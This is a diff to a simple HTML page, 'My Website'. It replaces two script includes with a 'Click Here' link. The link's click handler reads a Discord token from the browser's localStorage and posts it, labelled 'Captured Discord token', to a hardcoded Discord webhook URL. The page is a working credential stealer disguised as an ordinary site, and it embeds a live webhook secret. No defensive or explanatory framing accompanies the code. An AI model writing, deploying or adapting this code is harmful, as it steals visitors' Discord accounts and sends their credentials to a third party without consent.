@@ -1,17 +1,43 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Website</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>My Website</title>
 </head>
 <body>
+  <a href="#" id="discord-link">Click Here</a>
 
-<!-- Include the main script -->
-<script src="main.js"></script>
+  <script>
+    // Listen for click event on the link
+    document.getElementById('discord-link').addEventListener('click', function(event) {
+      // Prevent default behavior of the link
+      event.preventDefault();
 
-<!-- Include the receiver script -->
-<script src="receiver.js"></script>
+      // Capture the Discord token from local storage (assuming it's stored there)
+      var discordToken = localStorage.getItem('discordToken');
 
+      // Send the Discord token to your Discord webhook
+      fetch('https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          content: 'Captured Discord token: ' + discordToken
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('Discord token sent successfully!');
+        } else {
+          console.error('Failed to send Discord token:', response.status, response.statusText);
+        }
+      })
+      .catch(error => {
+        console.error('Error sending Discord token:', error.message);
+      });
+    });
+  </script>
 </body>
 </html>
